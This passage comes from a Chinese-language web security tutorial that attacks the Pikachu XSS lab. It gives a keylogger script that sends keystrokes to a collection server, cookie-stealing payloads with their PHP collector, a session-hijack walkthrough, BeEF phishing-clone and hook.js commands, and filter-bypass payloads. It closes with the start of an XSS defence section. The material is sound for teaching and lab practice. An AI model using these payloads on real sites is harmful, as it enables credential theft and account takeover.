        <span style="color: #a020f0;">for</span> (<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">i</span> = 0; i &lt; versions.length; i++) {
            <span style="color: #a020f0;">try</span> {
                request = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">ActiveXObject</span>(versions[i]);
                <span style="color: #a020f0;">if</span> (request) {
                    <span style="color: #a020f0;">return</span> request;
                }
            } <span style="color: #a020f0;">catch</span> (e) {
                request = <span style="color: #008b8b;">false</span>;
            }
        }
    }
    <span style="color: #a020f0;">return</span> request;
}
<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">ajax</span> = <span style="color: #008b8b;">null</span>;
<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">xl</span> = <span style="color: #8b2252;">"datax="</span>;

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">onkeypress</span>() {
    <span style="color: #a020f0;">var</span> <span style="color: #a0522d;">realkey</span> = String.fromCharCode(event.keyCode);
    xl += realkey; <span style="color: #b22222;">//</span><span style="color: #b22222;">&#33258;&#21152;&#65292;&#27599;&#21464;&#21270;&#19968;&#27425;&#21152;&#19968;&#27425;</span>
    show();
}
document.onkeypress = onkeypress; <span style="color: #b22222;">//</span><span style="color: #b22222;">&#35760;&#24405;&#25353;&#38190;</span>
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">show</span>() {
    ajax = createAjax();
    ajax.onreadystatechange = <span style="color: #a020f0;">function</span>() {
        <span style="color: #a020f0;">if</span> (ajax.readyState == 4) {
            <span style="color: #a020f0;">if</span> (ajax.status == 200) {
                <span style="color: #a020f0;">var</span> <span style="color: #a0522d;">data</span> = ajax.responseText;
            } <span style="color: #a020f0;">else</span> {
                alert(<span style="color: #8b2252;">"&#39029;&#38754;&#35831;&#27714;&#22833;&#36133;"</span>);
            }
        }
    }
    <span style="color: #a020f0;">var</span> <span style="color: #a0522d;">postdate</span> = xl; <span style="color: #b22222;">//</span><span style="color: #b22222;">xl&#36171;&#20540;&#32473;postdate</span>
    ajax.open(<span style="color: #8b2252;">"POST"</span>, <span style="color: #8b2252;">"http://127.0.0.1/pkxss/rkeypress/rkserver.php"</span>,<span style="color: #008b8b;">true</span>); <span style="color: #b22222;">//</span><span style="color: #b22222;">&#20351;&#29992;php&#33050;&#26412;&#25509;&#25910;&#38190;&#30424;&#35760;&#24405;&#30340;&#32467;&#26524;&#65292; &#27979;&#35797;&#26102;&#38656;&#20462;&#25913;&#35775;&#38382;&#22320;&#22336;</span>
    ajax.setRequestHeader(<span style="color: #8b2252;">"Content-type"</span>, <span style="color: #8b2252;">"application/x-www-form-urlencoded"</span>);
    ajax.setRequestHeader(<span style="color: #8b2252;">"Content-length"</span>, postdate.length);
    ajax.setRequestHeader(<span style="color: #8b2252;">"Connection"</span>, <span style="color: #8b2252;">"close"</span>);
    ajax.send(postdate); <span style="color: #b22222;">//</span><span style="color: #b22222;">&#21457;&#36865;postdate</span>
}
</pre>
</div>

<p>
此处我们修改为 127.0.0.1，即靶场地址
</p>


<figure id="orge1c48d4">
<img src="./images/Snipaste_2023-06-10_07-36-15.png" alt="Snipaste_2023-06-10_07-36-15.png" width="50%">

</figure>

<div class="org-src-container">
<pre class="src src-sh">&gt;_ docker exec -it pikachu bash
<span style="color: #483d8b;">cd</span> /var/www/html/pkxss/rkeypress
vim rk.js <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25913;&#25104;&#38774;&#22330;pikachu&#22320;&#22336;&#26469;&#25509;&#25910;&#38190;&#30424;&#20449;&#24687;</span>
    ajax.open(<span style="color: #8b2252;">"POST"</span>, <span style="color: #8b2252;">"http://10.0.0.151:8083/pkxss/rkeypress/rkserver.php"</span>,true);

</pre>
</div>


<p>
选择Cross-Site Scripting &#x2013;&gt; 存储型xss，输入payload
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">&#22312;&#30446;&#26631;&#39029;&#38754;&#65292;&#27880;&#20837;&#25910;&#38598;&#38190;&#30424;&#35760;&#24405;&#30340;&#20195;&#30721;&#12290;&#20462;&#25913;&#25104;&#33258;&#24049;&#30340;&#25910;&#38598;&#38190;&#30424;&#33050;&#26412;&#22320;&#22336;&#12290;</span>
&lt;script src=<span style="color: #8b2252;">"http://10.0.0.151:8083/pkxss/rkeypress/rk.js"</span>&gt;&lt;/script&gt;
</pre>
</div>

<p>
这时payload被加载了。
</p>


<figure id="orgb9dd47b">
<img src="./images/img_20250603_221607.png" alt="img_20250603_221607.png" width="50%">

</figure>

<p>
之后登录XSS后台进行查看，可以看到在留言板写的任何内容，在后台可以获取到键盘记录
</p>
<ul class="org-ul">
<li>打开另一个浏览器，打开pikachu页面，选择管理工具&#x2013;&gt;XSS后台。点击初始化，之后按提示“点这里”进行首页，admin/123456登录
<ul class="org-ul">
<li>点击键盘记录，现在还没有</li>
</ul></li>
<li>打开火狐浏览器，因为已经在存储型xss注入了收集键盘操作代码，那么我们在这个页面输入一些字符，如123456，这是不用点提交</li>
<li>在另一个浏览器上刷新页面，可看到键盘操作记录</li>
</ul>


<figure id="org074f972">
<img src="./images/Snipaste_2023-06-10_07-38-20.png" alt="Snipaste_2023-06-10_07-38-20.png" width="50%">

</figure>

<p>
pikachu Xss 获取键盘记录结果
</p>



<figure id="org99fd8f5">
<img src="./images/img_20250603_222948.png" alt="img_20250603_222948.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:84304d96-198e-45ef-8b91-b66b505d7e82" class="outline-3">
<h3 id="h:84304d96-198e-45ef-8b91-b66b505d7e82">XSS平台利用—获取cookie</h3>
<div class="outline-text-3" id="text-h:84304d96-198e-45ef-8b91-b66b505d7e82">
<p>
XSS 没那么厉害可以直接把服务器打下来，XSS是用来盗取信息的，最有用的信息就是cookie值
</p>
</div>
<div id="outline-container-h:9c6d42fd-7c4e-4f67-be44-73855b245db3" class="outline-4">
<h4 id="h:9c6d42fd-7c4e-4f67-be44-73855b245db3">初始化自带XSS平台</h4>
<div class="outline-text-4" id="text-h:9c6d42fd-7c4e-4f67-be44-73855b245db3">
<p>
点击 管理工具 -&gt; XSS后台：
</p>
<ul class="org-ul">
<li>初始化之后，通过页面上的用户名/密码进行登录：admin/123456</li>
<li>点击 cookie搜集 模块：
<ul class="org-ul">
<li>可以看到这时还没有获取到cookie</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:76ec688e-6192-4d0f-baa0-86342134a109" class="outline-4">
<h4 id="h:76ec688e-6192-4d0f-baa0-86342134a109">前台XSS盲打攻击获取cookie</h4>
<div class="outline-text-4" id="text-h:76ec688e-6192-4d0f-baa0-86342134a109">
<p>
前端 Cross-Site Scripting &#x2013;&gt; XSS之盲打模块，需要在此输入payload
</p>


<figure id="org9c1f000">
<img src="./images/Snipaste_2023-06-10_07-42-04.png" alt="Snipaste_2023-06-10_07-42-04.png" width="50%">

</figure>

<p>
查看XSS后台页面的源代码，发现其中的pkxss_cookie_result.php
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">html</span>&gt;
&lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">http-equiv</span>=<span style="color: #8b2252;">"Content-Type"</span> <span style="color: #a0522d;">content</span>=<span style="color: #8b2252;">"text/html; charset=utf-8"</span> /&gt;
    &lt;<span style="color: #0000ff;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">pikachu Xss &#21518;&#21488;</span>&lt;/<span style="color: #0000ff;">title</span>&gt;
    &lt;<span style="color: #0000ff;">link</span> <span style="color: #a0522d;">rel</span>=<span style="color: #8b2252;">"stylesheet"</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text/css"</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"pkxss.css"</span>/&gt;
&lt;/<span style="color: #0000ff;">head</span>&gt;
&lt;<span style="color: #0000ff;">body</span>&gt;
&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"title"</span>&gt;
    &lt;<span style="color: #0000ff;">h1</span>&gt;<span style="font-weight: bold; text-decoration: underline;">pikachu Xss &#21518;&#21488;</span>&lt;/<span style="color: #0000ff;">h1</span>&gt;
    &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"xsstest_main"</span>&gt;
        &lt;<span style="color: #0000ff;">h2</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"left_title"</span>&gt;&#27979;&#35797;&#27169;&#22359; |&lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"xssmanager.php?logout=1"</span>&gt;&#36864;&#20986;&#30331;&#38470;&lt;/<span style="color: #0000ff;">a</span>&gt;&lt;/<span style="color: #0000ff;">h2</span>&gt;
        &lt;<span style="color: #0000ff;">ul</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"left_list"</span>&gt;
            &lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"xcookie/pkxss_cookie_result.php"</span>&gt;cookie&#25628;&#38598;&lt;/<span style="color: #0000ff;">a</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
            &lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"xfish/pkxss_fish_result.php"</span>&gt;&#38035;&#40060;&#32467;&#26524;&lt;/<span style="color: #0000ff;">a</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
            &lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"rkeypress/pkxss_keypress_result.php"</span>&gt;&#38190;&#30424;&#35760;&#24405;&lt;/<span style="color: #0000ff;">a</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
        &lt;/<span style="color: #0000ff;">ul</span>&gt;
    &lt;/<span style="color: #0000ff;">div</span>&gt;
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>


<figure id="org5f34165">
<img src="./images/Snipaste_2023-06-10_07-42-37.png" alt="Snipaste_2023-06-10_07-42-37.png" width="50%">

</figure>

<p>
pikachu后端环境中，是通过同一目录下的 cookie.php 文件来获取cookie
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;_ docker exec -it pikachu bash
<span style="color: #483d8b;">cd</span> /var/www/html/pkxss/xcookie/
ls
cookie.php  pkxss_cookie_result.php  post.html

cat cookie.php 
&lt;?php
include_once <span style="color: #8b2252;">'../inc/config.inc.php'</span>;
include_once <span style="color: #8b2252;">'../inc/mysql.inc.php'</span>;
$<span style="color: #a0522d;">link</span>=connect();

//&#36825;&#20010;&#26159;&#33719;&#21462;cookie&#30340;api&#39029;&#38754;

<span style="color: #a020f0;">if</span>(isset($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'cookie'</span>])){
    $<span style="color: #a0522d;">time</span>=date(<span style="color: #8b2252;">'Y-m-d g:i:s'</span>);
    $<span style="color: #a0522d;">ipaddress</span>=getenv (<span style="color: #8b2252;">'REMOTE_ADDR'</span>);
    $<span style="color: #a0522d;">cookie</span>=$<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'cookie'</span>];
    $<span style="color: #a0522d;">referer</span>=$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTP_REFERER'</span>];
    $<span style="color: #a0522d;">useragent</span>=$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTP_USER_AGENT'</span>];
    $<span style="color: #a0522d;">query</span>=<span style="color: #8b2252;">"insert cookies(time,ipaddress,cookie,referer,useragent) </span>
<span style="color: #8b2252;">    values('$time','$ipaddress','$cookie','$referer','$useragent')"</span>;
    $<span style="color: #a0522d;">result</span>=mysqli_query($<span style="color: #a0522d;">link</span>, $<span style="color: #a0522d;">query</span>);  // &#25910;&#38598;&#30340;cookie&#20449;&#24687;&#20445;&#23384;&#22312;&#25968;&#25454;&#24211;&#20013;
}
<span style="color: #0000ff;">header</span>(<span style="color: #8b2252;">"Location:http://192.168.1.4/pikachu/index.php"</span>);//&#37325;&#23450;&#21521;&#21040;&#19968;&#20010;&#21487;&#20449;&#30340;&#32593;&#31449;

?&gt;
</pre>
</div>


<figure id="orge53f5e4">
<img src="./images/Snipaste_2023-06-10_07-44-01.png" alt="Snipaste_2023-06-10_07-44-01.png" width="50%">

</figure>

<p>
XSS盗取cookie payload
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">&#20351;&#29992; document.write &#21521;&#39029;&#38754;&#20013;&#20889;&#20837;&#19968;&#20010; img &#26631;&#31614;, src&#35775;&#38382; cookie.php &#24182;&#25552;&#20379; cookie &#21442;&#25968;&#20026; document.cookie&#12290;&#27880;&#24847;&#25913;&#25104;&#33258;&#24049;&#30340;&#33050;&#26412;&#22320;&#22336;</span>
&lt;script&gt;document.write(<span style="color: #8b2252;">'&lt;img src="http://127.0.0.1/pkxss/xcookie/cookie.php?cookie='</span>+document.cookie+<span style="color: #8b2252;">'"/&gt;'</span>)&lt;/script&gt;
</pre>
</div>

<p>
测试
</p>

<p>
1.在火狐浏览器，pikachu的xss之盲打页面，写入 payload，提交
</p>


<figure id="orgce79cdd">
<img src="./images/Snipaste_2023-06-10_07-45-18.png" alt="Snipaste_2023-06-10_07-45-18.png" width="50%">

</figure>

<p>
提交后显示后台已经收到："谢谢参与，阁下的看法我们已经收到！"
</p>

<p>
2.点击右上角提示，访问后台地址 <a href="http://127.0.0.1/vul/xss/xssblind/admin_login.php">http://127.0.0.1/vul/xss/xssblind/admin_login.php</a> 并输入管理员用户名/密码: admin/123456 登录
</p>

<p>
可以看到插入一张图片
</p>

<p>
3.另一个浏览器打开XSS后台，查看cookie搜集 模块可以看到已经盗取到了cookie
</p>


<figure id="org31e06fa">
<img src="./images/Snipaste_2023-06-10_07-47-31.png" alt="Snipaste_2023-06-10_07-47-31.png" width="50%">

</figure>

<p>
4.利用cookie登录
</p>

<p>
这时候回到 admin 后台，点击 退出登录
</p>

<div class="org-src-container">
<pre class="src src-sh">http://10.0.0.151:8083/vul/xss/xssblind/admin_login.php <span style="color: #b22222;">#</span><span style="color: #b22222;">&#30331;&#24405;&#21069;&#30340;&#22320;&#22336;</span>
http://10.0.0.151:8083/vul/xss/xssblind/admin.php <span style="color: #b22222;">#</span><span style="color: #b22222;">&#30331;&#24405;&#21518;&#30340;&#22320;&#22336;</span>
</pre>
</div>


<figure id="org5b7759a">
<img src="./images/Snipaste_2023-06-10_07-48-23.png" alt="Snipaste_2023-06-10_07-48-23.png" width="50%">

</figure>

<p>
使用 <code>Cookie-Editor</code> 浏览器插件 修改cookie， 将盗取到的cookie填入
</p>


<figure id="org20afa94">
<img src="./images/Snipaste_2023-06-10_07-49-39.png" alt="Snipaste_2023-06-10_07-49-39.png" width="50%">

</figure>


<figure id="org801897f">
<img src="./images/Snipaste_2023-06-10_07-50-35.png" alt="Snipaste_2023-06-10_07-50-35.png" width="50%">

</figure>

<p>
添加好之后，直接访问登录后的地址 <a href="http://127.0.0.1/vul/xss/xssblind/admin.php">http://127.0.0.1/vul/xss/xssblind/admin.php</a> 页面，可以直接登录访问
</p>


<figure id="orgc44f81b">
<img src="./images/Snipaste_2023-06-10_07-51-24.png" alt="Snipaste_2023-06-10_07-51-24.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:0c8f232c-14d5-4096-b0fc-57ad5fa33b93" class="outline-4">
<h4 id="h:0c8f232c-14d5-4096-b0fc-57ad5fa33b93">BeEF-XSS</h4>
<div class="outline-text-4" id="text-h:0c8f232c-14d5-4096-b0fc-57ad5fa33b93">
<p>
BeEF（Browser Exploitation Framework）是一款非常强大的Web框架攻击平台，集成了许多payload，可以通过XSS漏洞配合JavaScript脚本和Metasploit进行渗透。BeEF基于Ruby语言编写，并且支持图形化界面，操作简单。
</p>

<p>
BeEF: <a href="https://beefproject.com/">https://beefproject.com/</a>
</p>


<figure id="org15615c6">
<img src="./images/Snipaste_2023-06-10_07-52-56.png" alt="Snipaste_2023-06-10_07-52-56.png" width="50%">

</figure>

<p>
支持 Docker 快速安装
</p>

<div class="org-src-container">
<pre class="src src-sh">git clone https://github.com/beefproject/beef
<span style="color: #483d8b;">cd</span> beef
sudo docker build -t beef .
sudo docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 --name beef beef

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20854;&#20182;</span>
docker run --rm -p 3000:3000 janes/beef
</pre>
</div>

<p>
debian/ubuntu系统安装
</p>
<ul class="org-ul">
<li>下载ruby <a href="https://www.ruby-lang.org/zh_cn/downloads/">https://www.ruby-lang.org/zh_cn/downloads/</a>
<ul class="org-ul">
<li>使用RVM 包管理<a href="https://rvm.io/">https://rvm.io/</a></li>
</ul></li>
</ul>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">https://github.com/beefproject/beef/wiki/Installation</span>
sudo apt update -y
<span style="color: #b22222;">#</span><span style="color: #b22222;">sudo apt install ruby ruby-dev git -y</span>
sudo apt install gnupg2
gpg2 --keyserver keyserver.ubuntu.com --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB
\curl -sSL https://get.rvm.io | bash -s stable
<span style="color: #483d8b;">source</span> /etc/profile.d/rvm.sh
rvm install 3.0.0
rvm use 3.0.0 --default <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20999;&#25442;&#21040;&#21018;&#21018;&#23433;&#35013;&#30340; Ruby &#29256;&#26412;</span>

git clone https://github.com/beefproject/beef
<span style="color: #483d8b;">cd</span> beef/
./install  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23545;&#20004;&#20010;&#25552;&#31034;&#37117;&#35828; 'y'</span>
vim config.yaml <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20462;&#25913;&#29992;&#25143;&#21517;&#21450;&#23494;&#30721;  beef/123</span>
./beef
</pre>
</div>

<p>
新版 kali 系统自带beef工具。
</p>

<p>
配置：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#23433;&#35013;beef</span>
sudo apt install beef-xss

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#37197;&#32622;&#25991;&#20214;</span>
/usr/share/beef-xss/config.yaml
</pre>
</div>

<ul class="org-ul">
<li>找到配置文件，修改监听地址为本机IP</li>
<li>在配置文件中修改用户名/密码为 beef/123，否则无法正常启动beef</li>
</ul>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;beef</span>
<span style="color: #483d8b;">cd</span> /usr/share/beef-xss
./beef

[ 3:47:52]    |   Hook URL: http://192.168.1.42:3000/hook.js 
[ 3:47:52]    |_  UI URL:   http://192.168.1.42:3000/ui/panel <span style="color: #b22222;">#</span><span style="color: #b22222;">&#31649;&#29702;&#39029;&#38754;</span>
[ 3:47:52][*] RESTful API key: 58d3215b8e8a34ed3ecede58cfb617f60e00b9c4 <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20196;&#29260;</span>
</pre>
</div>

<ul class="org-ul">
<li>启动后，访问 <a href="http://172.22.104.84:3000/ui/panel">http://172.22.104.84:3000/ui/panel</a> 页面</li>
<li>会自动跳转到 <a href="http://172.22.104.84:3000/ui/authentication">http://172.22.104.84:3000/ui/authentication</a> 页面</li>
<li>使用 beef/123 进行登录</li>
</ul>

<p>
（1）使用beef克隆其他网站
</p>


<figure id="org5fd7077">
<img src="./images/Snipaste_2023-06-10_07-55-35.png" alt="Snipaste_2023-06-10_07-55-35.png" width="50%">

</figure>

<div class="org-src-container">
<pre class="src src-sh">curl -H <span style="color: #8b2252;">"Content-Type: application/json; charset=UTF-8"</span> -d <span style="color: #8b2252;">'{"url":"&lt;URL of site to clone&gt;", "mount":"&lt;where to mount&gt;"}'</span> -X POST http://&lt;BeEFURL&gt;/api/seng/clone_page?<span style="color: #a0522d;">token</span>=&lt;token&gt;

// &lt;URL of site to clone&gt; &#38656;&#35201;&#20811;&#38534;&#30340;&#32593;&#22336;
// &lt;where to mount&gt; &#20811;&#38534;&#30340;&#39029;&#38754;&#22312;&#26381;&#21153;&#22120;&#30340;&#21738;&#20010;&#36335;&#24452;&#35775;&#38382;
// &lt;token&gt; &#26381;&#21153;&#21551;&#21160;&#26102;&#30340; beef API key

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20811;&#38534;</span>
curl -H <span style="color: #8b2252;">"Content-Type: application/json; charset=UTF-8"</span> -d <span style="color: #8b2252;">'{"url":"https://www.xxx.com","mount":"/clone_site_xxx"}'</span> -X POST http://172.22.104.84:3000/api/seng/clone_page?<span style="color: #a0522d;">token</span>=ebc5b09df34b36616640567a721371352b6ce8a7
</pre>
</div>


<p>
可以看到成功复制页面
</p>

<p>
浏览器访问beef制作的钓鱼页面后，可以看到有机器上线
</p>

<p>
（2）使用beef克隆 pikachu 平台的”反射型XSS(post)“的登录页面获取账号密码
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -H <span style="color: #8b2252;">"Content-Type: application/json; charset=UTF-8"</span> -d <span style="color: #8b2252;">'{"url":"http://pikachu_ip/vul/xss/xsspost/post_login.php","mount":"/pikachu_xxx"}'</span> -X POST http://kali_ip:3000/api/seng/clone_page?<span style="color: #a0522d;">token</span>=XXX
</pre>
</div>

<p>
访问 <a href="http://kali_ip:3000/pikachu_xxx">http://kali_ip:3000/pikachu_xxx</a> ，可以看到beef中有机器上线，在页面中进行登录
</p>

<p>
可以在beef的 logs 模块中查看到提交的 form 表单信息
</p>

<p>
（3）使用beef克隆 pikachu 平台的”XSS之盲打“页面获取cookie
</p>

<p>
在”XSS之盲打“中上传hook脚本，让用户触发XSS
</p>


<figure id="org042fbac">
<img src="./images/Snipaste_2023-06-10_07-59-08.png" alt="Snipaste_2023-06-10_07-59-08.png" width="50%">

</figure>

<div class="org-src-container">
<pre class="src src-sh">&lt;script <span style="color: #a0522d;">src</span>=<span style="color: #8b2252;">"http://192.168.1.42:3000/hook.js"</span>&gt;&lt;/script&gt;
</pre>
</div>

<p>
登录盲打模块的留言板后台，注意使用火狐浏览器，其它浏览器不行，可以看到机器上线选择 <code>Current Browser -&gt; Commands --&gt; Hooked Domain -&gt; Get Cookie</code> 并点击 <code>Execute</code> 获取 cookie
</p>

<p>
Commands下展示的是可以执行的命令模块，BeEF可以检测出哪些命令模块可以在当前受害的浏览器工作， 并用颜色表示：
</p>

<ul class="org-ul">
<li>绿色：命令模块可以在目标浏览器上运行，且用户不会感到任何异常</li>
<li>橙色：命令模块可以在目标浏览器上运行，但是用户可能会感到异常（比如可能会有弹窗，提示，跳转等）</li>
<li>灰色：命令模块尚未针对此目标进行验证，即不知道能否可运行</li>
<li>红色：命令模块不适用于此目标</li>
</ul>

<p>
获取到了 cookie （可以再回到克隆页面，F12查看验证一下cookie值是否对应）
</p>
</div>
</div>
</div>
<div id="outline-container-h:9ac0dd43-f3fb-4b2b-9a28-e1cad17aac4b" class="outline-3">
<h3 id="h:9ac0dd43-f3fb-4b2b-9a28-e1cad17aac4b">XSS防御绕过</h3>
<div class="outline-text-3" id="text-h:9ac0dd43-f3fb-4b2b-9a28-e1cad17aac4b">
<p>
在实际的网站中，或多或少都会做一些安全措施去防御XSS漏洞的攻击，但是这些安全措施也存在方法、逻辑不严谨的情况，可以被绕过。
</p>
</div>
<div id="outline-container-h:1b083bac-a542-4ab1-a48e-dd7477f64451" class="outline-4">
<h4 id="h:1b083bac-a542-4ab1-a48e-dd7477f64451">过滤不严格</h4>
<div class="outline-text-4" id="text-h:1b083bac-a542-4ab1-a48e-dd7477f64451">
<p>
Pikachu的Cross-Site Scripting &#x2013;&gt; XSS过滤中发现，是对&lt;script&gt;标签进行了过滤：
</p>


<figure id="org2326f16">
<img src="./images/Snipaste_2023-06-10_08-02-17.png" alt="Snipaste_2023-06-10_08-02-17.png" width="50%">

</figure>


<figure id="orgb12954b">
<img src="./images/Snipaste_2023-06-10_08-02-47.png" alt="Snipaste_2023-06-10_08-02-47.png" width="50%">

</figure>

<p>
使用大小写或者事件触发成功绕过
</p>
<div class="org-src-container">
<pre class="src src-javascript">&lt;ScRiPt&gt;alert(1)&lt;/ScRipt&gt; <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22823;&#23567;&#20889;&#28151;&#21512;&#32469;&#36807;</span>
&lt;img src=<span style="color: #8b2252;">""</span> onerror=alert(1)&gt; <span style="color: #b22222;">// </span><span style="color: #b22222;">img&#26631;&#31614;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:fee328dc-578b-4629-8da4-a7a8289b1ab1" class="outline-4">
<h4 id="h:fee328dc-578b-4629-8da4-a7a8289b1ab1">HTML实体编码默认配置</h4>
<div class="outline-text-4" id="text-h:fee328dc-578b-4629-8da4-a7a8289b1ab1">
<p>
前面HTML&amp;JavaScript的讲解中我们说过，XSS漏洞最好的防御方法是做实体编码。HTML实体编码字符为：
</p>

<div class="org-src-container">
<pre class="src src-sh">&amp; &#65288;&#21644;&#21495;&#65289; &#25104;&#20026; &amp;amp;
<span style="color: #8b2252;">" &#65288;&#21452;&#24341;&#21495;&#65289; &#25104;&#20026; &amp;quot;</span>
<span style="color: #8b2252;">' &#65288;&#21333;&#24341;&#21495;&#65289; &#25104;&#20026; &amp;#039;</span>
<span style="color: #8b2252;">&lt; &#65288;&#23567;&#20110;&#65289; &#25104;&#20026; &amp;lt;</span>
<span style="color: #8b2252;">&gt; &#65288;&#22823;&#20110;&#65289; &#25104;&#20026; &amp;gt;</span>
</pre>
</div>

<p>
以PHP为例，在PHP中htmlspecialchars()函数是把一些预定义的字符转换为HTML实体，返回转换后的新字符串，原字符串不变。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">htmlspecialchars</span>()&#20989;&#25968;&#30340;&#35821;&#27861;&#65306;htmlspecialchars(string,flags,characterset,double_encode)
</pre>
</div>

<p>
该函数默认配置下仅过滤掉双引号，只有设置quotestyle的类型，规定如何编码才会过同时滤掉单引号和双引号。
</p>

<p>
可用的quotestyle类型：
</p>
<ul class="org-ul">
<li>ENT_COMPAT - 默认，仅编码双引号</li>
<li>ENT_QUOTES - 编码双引号和单引号</li>
<li>ENT_NOQUOTES - 不编码任何引号</li>
</ul>

<p>
htmlspecialchars 函数测试
</p>
<div class="org-src-container">
<pre class="src src-php">&lt;?php
$str = "Bill\" &amp; 'Steve'";
echo htmlspecialchars($str, ENT_COMPAT); // 只转换双引号
echo "\n";
echo htmlspecialchars($str, ENT_QUOTES); // 转换双引号和单引号
echo "\n";
echo htmlspecialchars($str, ENT_NOQUOTES); // 不转换任何引号
</pre>
</div>


<figure id="org2a84269">
<img src="./images/Snipaste_2023-06-10_08-06-18.png" alt="Snipaste_2023-06-10_08-06-18.png" width="50%">

</figure>


<p>
到 Cross-Site Scripting &#x2013;&gt;xss之htmlspecialchars
</p>

<ul class="org-ul">
<li>输入特殊字符 <code>' " &lt; &gt;</code> ，点击提交。浏览器F12查看前端源码，我们看到 " &lt; &gt; 都进行了html实体转码.</li>
</ul>


<figure id="org2b5847e">
<img src="./images/Snipaste_2023-06-10_08-07-11.png" alt="Snipaste_2023-06-10_08-07-11.png" width="50%">

</figure>



<figure id="org865a6f0">
<img src="./images/Snipaste_2023-06-10_08-07-36.png" alt="Snipaste_2023-06-10_08-07-36.png" width="50%">

</figure>

<p>
但是没有对 ' 进行实体转码，可以使用单引号构造payload
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">' onclick='alert(/xss/)</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">' onmousemove='alert(/xss/)</span>
</pre>
</div>

<p>
可以看到我们的输入变成了下图所示
</p>


<figure id="orgbcbd66e">
<img src="./images/Snipaste_2023-06-10_08-08-27.png" alt="Snipaste_2023-06-10_08-08-27.png" width="50%">

</figure>

<p>
点击语句即可触发弹窗
</p>


<figure id="org59afc8e">
<img src="./images/Snipaste_2023-06-10_08-08-54.png" alt="Snipaste_2023-06-10_08-08-54.png" width="50%">

</figure>
</div>
</div>
</div>
<div id="outline-container-h:233e62de-13b3-4c41-a1a6-d2824886d144" class="outline-3">
<h3 id="h:233e62de-13b3-4c41-a1a6-d2824886d144">XSS安全防御</h3>
<div class="outline-text-3" id="text-h:233e62de-13b3-4c41-a1a6-d2824886d144">
<p>
通过前面的介绍可以得知，XSS 攻击有两大要素：
</p>
<ol class="org-ol">
<li>攻击者提交恶意代码 &#x2013; 输入</li>
<li>浏览器执行恶意代码 &#x2013; 输出</li>
</ol>

<p>
根本的解决方法： <b>从输入到输出都需要过滤、转义</b> 。
</p>
</div>
<div id="outline-container-h:7019afe8-8478-468f-bd69-62f5cc45970b" class="outline-4">
<h4 id="h:7019afe8-8478-468f-bd69-62f5cc45970b">输入检查</h4>
<div class="outline-text-4" id="text-h:7019afe8-8478-468f-bd69-62f5cc45970b">
<p>
输入检查的逻辑，必须放在服务端代码中实现。如果只是在客户端使用JavaScript进行输入检查，是很容易被攻击者绕过的。目前Web开发的普遍做法，是同时在客户端JavaScript中和服务端代码中实现相同的输入检查。
</p>

<p>
以下为需过滤的常见字符：
</p>
<div class="org-src-container">
<pre class="src src-sh">[1] |&#65288;&#31446;&#32447;&#31526;&#21495;&#65289;
